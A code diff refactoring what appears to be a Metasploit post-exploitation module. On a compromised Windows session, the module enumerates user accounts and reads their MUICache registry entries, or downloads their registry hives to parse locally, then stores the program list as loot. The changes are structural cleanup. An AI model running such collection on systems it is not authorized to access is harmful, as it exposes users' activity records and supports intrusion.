@@ -32,10 +32,10 @@ class Metasploit3 < Msf::Post
     ))
   end
 
-  def find_user_names()
-    # This function scrapes usernames, sids and homepaths from the
-    # registry so that we'll know what user accounts are on the system
-    # and where we can find those users registry hives.
+  # Scrapes usernames, sids and homepaths from the registry so that we'll know
+  # what user accounts are on the system and where we can find those users
+  # registry hives.
+  def find_user_names
     user_names = []
     user_homedir_paths = []
     user_sids = []
@@ -65,169 +65,174 @@ class Metasploit3 < Msf::Post
     return user_names, user_homedir_paths, user_sids
   end
 
+  # This function builds full registry muicache paths so that we can
+  # later enumerate the muicahe registry key contents.
   def enum_muicache_paths(sys_sids, mui_path)
-    # This function builds full registry muicache paths so that we can
-    # later enumerate the muicahe registry key contents.
     user_mui_paths = []
     hive = "HKU\\"
+
     sys_sids.each do |sid|
       full_path = hive + sid + mui_path
       user_mui_paths << full_path
     end
-    return user_mui_paths
+
+    user_mui_paths
   end
 
-  def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file, table)
-    # This is the main enumeration function that calls other main
-    # functions depending if we can access the registry directly or if
-    # we need to download the hive and process it locally.
+  # This is the main enumeration function that calls other main
+  # functions depending if we can access the registry directly or if
+  # we need to download the hive and process it locally.
+  def enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)
+    results = []
+
     loot_path = Msf::Config::loot_directory
     all_user_entries = sys_users.zip(muicache_reg_keys, sys_paths)
+
     all_user_entries.each do |user, reg_key, sys_path|
       local_hive_copy = ::File.join(loot_path, "#{sysinfo['Computer']}_#{user}_HIVE_#{::Time.now.utc.strftime('%Y%m%d.%M%S')}")
       subkeys = registry_enumvals(reg_key)
-      unless subkeys.blank?
+      if subkeys.blank?
+        # If the registry_enumvals returns us nothing then we'll know
+        # that the user is most likely not logged in and we'll need to
+        # download and process users hive locally.
+        print_error("User #{user}: Can't access registry (maybe the user is not logged in atm?). Trying NTUSER.DAT/USRCLASS.DAT..")
+        results = process_hive(sys_path, user, local_hive_copy, muicache, hive_file) || []
+      else
         # If the registry_enumvals returns us content we'll know that we
         # can access the registry directly and thus continue to process
         # the content collected from there.
         print_status("User #{user}: Enumerating registry..")
         subkeys.each do |key|
           if key[0] != "@" and key != "LangID" and not key.nil?
-            check_file_exists(key, user, table)
+            result = check_file_exists(key, user)
+            results << result unless result.nil?
           end
         end
-      else
-        # If the registry_enumvals returns us nothing then we'll know
-        # that the user is most likely not logged in and we'll need to
-        # download and process users hive locally.
-        print_error("User #{user}: Can't access registry (maybe the user is not logged in atm?). Trying NTUSER.DAT/USRCLASS.DAT..")
-        process_hive(sys_path, user, local_hive_copy, table, muicache, hive_file)
       end
     end
-    return table
+
+    results
   end
 
-  def check_file_exists(key, user, table)
-    # This function will check if it can find the program executable
-    # from the path it found from the registry. Permissions might affect
-    # if it detects the executable but it should be otherwise fairly
-    # reliable.
+  # This function will check if it can find the program executable
+  # from the path it found from the registry. Permissions might affect
+  # if it detects the executable but it should be otherwise fairly
+  # reliable.
+  def check_file_exists(key, user)
     program_path = expand_path(key)
     if file_exist?(key)
-      table << [user, program_path, "File found"]
+      return [user, program_path, "File found"]
     else
-      table << [user, program_path, "File not found"]
+      return [user, program_path, "File not found"]
     end
   end
 
-  def process_hive(sys_path, user, local_hive_copy, table, muicache, hive_file)
-    # This function will check if the filepath contains a registry hive
-    # and if it does it'll proceed to call the function responsible of
-    # downloading the hive. After successfull download it'll continue to
-    # call the hive_parser function which will extract the contents of
-    # the MUICache registry key.
+  # This function will check if the filepath contains a registry hive
+  # and if it does it'll proceed to call the function responsible of
+  # downloading the hive. After successfull download it'll continue to
+  # call the hive_parser function which will extract the contents of
+  # the MUICache registry key.
+  def process_hive(sys_path, user, local_hive_copy, muicache, hive_file)
     user_home_path = expand_path(sys_path)
     hive_path = user_home_path + hive_file
-    ntuser_status = client.fs.file.exists?(hive_path)
-    if ntuser_status == true
-      print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file..")
-      hive_status = hive_download_status(local_hive_copy, hive_path)
-      if hive_status == true
-        hive_parser(local_hive_copy, muicache, user, table)
-      else
-        print_error("All registry hive download attempts failed. Unable to continue.")
-        return nil
-      end
-    else
+    ntuser_status = file_exist?(hive_path)
+
+    unless ntuser_status == true
       print_error("Couldn't locate/download #{user}'s registry hive. Can't proceed.")
       return nil
     end
-  end
 
-  def hive_download_status(local_hive_copy, hive_path)
-    # This function downloads registry hives and checks for integrity
-    # after the transfer has completed so that we don't end up
-    # processing broken registry hive.
-    hive_status = false
-    3.times do
-      remote_hive_hash_raw = client.fs.file.md5(hive_path)
-      unless remote_hive_hash_raw.blank?
-        remote_hive_hash = remote_hive_hash_raw.unpack('H*')
-        session.fs.file.download_file(local_hive_copy, hive_path)
-        local_hive_hash = file_local_digestmd5(local_hive_copy)
-        if local_hive_hash == remote_hive_hash[0]
-          print_good("Hive downloaded successfully.")
-          hive_status = true
-          break
-        else
-          print_error("Hive download corrupted, trying again (max 3 times)..")
-          File.delete(local_hive_copy) # Downloaded corrupt hive gets deleted before new attempt is made
-          hive_status = false
-        end
-      end
+    print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file..")
+    hive_status = hive_download_status(local_hive_copy, hive_path)
+
+    unless hive_status == true
+      print_error("All registry hive download attempts failed. Unable to continue.")
+      return nil
     end
-    return hive_status
+
+    hive_parser(local_hive_copy, muicache, user)
   end
 
-  def hive_parser(local_hive_copy, muicache, user, table)
-    # This function is responsible for parsing the downloaded hive and
-    # extracting the contents of the MUICache registry key.
-    print_status("Phase 3: Parsing registry content..")
+  # This function downloads registry hives and checks for integrity
+  # after the transfer has completed so that we don't end up
+  # processing broken registry hive.
+  def hive_download_status(local_hive_copy, hive_path)
+    hive_status = false
+
+    3.times do
+      remote_hive_hash_raw = file_remote_digestmd5(hive_path)
+      if remote_hive_hash_raw.blank?
+        next
+      end
+
+      remote_hive_hash = remote_hive_hash_raw.unpack('H*')
+      session.fs.file.download_file(local_hive_copy, hive_path)
+      local_hive_hash = file_local_digestmd5(local_hive_copy)
+      if local_hive_hash == remote_hive_hash[0]
+        print_good("Hive downloaded successfully.")
+        hive_status = true
+        break
+      else
+        print_error("Hive download corrupted, trying again (max 3 times)..")
+        File.delete(local_hive_copy) # Downloaded corrupt hive gets deleted before new attempt is made
+        hive_status = false
+      end
+
+    end
+
+    hive_status
+  end
+
+  # This function is responsible for parsing the downloaded hive and
+  # extracting the contents of the MUICache registry key.
+  def hive_parser(local_hive_copy, muicache, user)
+    results = []
+    print_status("Parsing registry content..")
     err_msg = "Error parsing hive. Can't continue."
     hive = Rex::Registry::Hive.new(local_hive_copy)
     if hive.nil?
       print_error(err_msg)
       return nil
-    else
-      muicache_key = hive.relative_query(muicache)
-      if muicache_key.nil?
-        print_error(err_msg)
-        return nil
-      else
-        muicache_key_value_list = muicache_key.value_list
-        if muicache_key_value_list.nil?
-          print_error(err_msg)
-          return nil
-        else
-          muicache_key_values = muicache_key_value_list.values
-          if muicache_key_values.nil?
-            print_error(err_msg)
-            return nil
-          else
-            muicache_key_values.each do |value|
-              key = value.name
-              if key[0] != "@" and key != "LangID" and not key.nil?
-                check_file_exists(key, user, table)
-              end
-            end
-          end
-        end
+    end
+
+    muicache_key = hive.relative_query(muicache)
+    if muicache_key.nil?
+      print_error(err_msg)
+      return nil
+    end
+
+    muicache_key_value_list = muicache_key.value_list
+    if muicache_key_value_list.nil?
+      print_error(err_msg)
+      return nil
+    end
+
+    muicache_key_values = muicache_key_value_list.values
+    if muicache_key_values.nil?
+      print_error(err_msg)
+      return nil
+    end
+
+    muicache_key_values.each do |value|
+      key = value.name
+      if key[0] != "@" and key != "LangID" and not key.nil?
+        result = check_file_exists(key, user)
+        results << result unless result.nil?
       end
     end
+
     File.delete(local_hive_copy) # Downloaded hive gets deleted after processing
-    return table
+
+    results
   end
 
-  def print_user_names(sys_users)
-    # This prints usernames pulled from the paths found from the
-    # registry.
-    user_list = []
-    sys_users.each do |user|
-      user_list << user
-    end
-    users = user_list.join(", ")
-    print_good("Found users: #{users}")
-  end
-
+  # Information about the MUICache registry key was collected from:
+  #
+  # - Windows Forensic Analysis Toolkit / 2012 / Harlan Carvey
+  # - Windows Registry Forensics / 2011 / Harlan Carvey
+  # - http://forensicartifacts.com/2010/08/registry-muicache/
+  # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots
   def run
-
-    # Information about the MUICache registry key was collected from:
-    #
-    # - Windows Forensic Analysis Toolkit / 2012 / Harlan Carvey
-    # - Windows Registry Forensics / 2011 / Harlan Carvey
-    # - http://forensicartifacts.com/2010/08/registry-muicache/
-    # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots
-
     print_status("Starting to enumerate MuiCache registry keys..")
     sys_info = sysinfo['OS']
 
@@ -254,24 +259,27 @@ class Metasploit3 < Msf::Post
         "File status",
       ])
 
-    print_status("Phase 1: Searching usernames..")
-    sys_users, sys_paths, sys_sids = find_user_names()
+    print_status("Phase 1: Searching user names..")
+    sys_users, sys_paths, sys_sids = find_user_names
 
     if sys_users.blank?
       print_error("Was not able to find any user accounts. Unable to continue.")
       return nil
     else
-      print_user_names(sys_users)
+      print_good("Users found: #{sys_users.join(", ")}")
     end
 
     print_status("Phase 2: Searching registry hives..")
     muicache_reg_keys = enum_muicache_paths(sys_sids, muicache)
-    results = enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file, table).to_s
+    results = enumerate_muicache(muicache_reg_keys, sys_users, sys_paths, muicache, hive_file)
 
-    print_status("Phase 4: Processing results..")
-    loot = store_loot("muicache_info", "text/plain", session, results, nil, "MUICache Information")
-    print_line("\n" + results + "\n")
+    results.each { |r| table << r }
+
+    print_status("Phase 3: Processing results..")
+    loot = store_loot("muicache_info", "text/plain", session, table.to_s, nil, "MUICache Information")
+    print_line("\n" + table.to_s + "\n")
     print_status("Results stored in: #{loot}")
     print_status("Execution finished.")
   end
+
 end
